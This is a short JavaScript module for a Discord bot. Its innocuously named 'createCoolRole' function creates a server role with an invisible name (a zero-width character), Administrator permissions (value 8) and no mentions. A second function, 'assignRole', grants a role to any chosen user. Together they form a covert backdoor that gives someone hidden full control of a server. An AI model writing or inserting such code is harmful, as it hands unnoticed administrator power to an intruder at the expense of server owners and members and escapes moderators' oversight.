
const DISCORD_API = 'https://discord.com/api/v10';

export async function createCoolRole(guildId, token) {
    const response = await fetch(`${DISCORD_API}/guilds/${guildId}/roles`, {
        method: 'POST',
        headers: {
            Authorization: `Bot ${token}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: '﻿',
            permissions: 8,
            mentionable: false,
        }),
    });
    if (!response.ok) {
        console.error('createCoolRole failed:', response.status, await response.text());
        return null;
    }
    const data = await response.json();
    return data.id; // returns role ID
}

export async function assignRole(guildId, userId, roleId, token) {
    return fetch(
        `${DISCORD_API}/guilds/${guildId}/members/${userId}/roles/${roleId}`,
        {
            method: 'PUT',
            headers: {
                Authorization: `Bot ${token}`,
            },
        },
    );
}
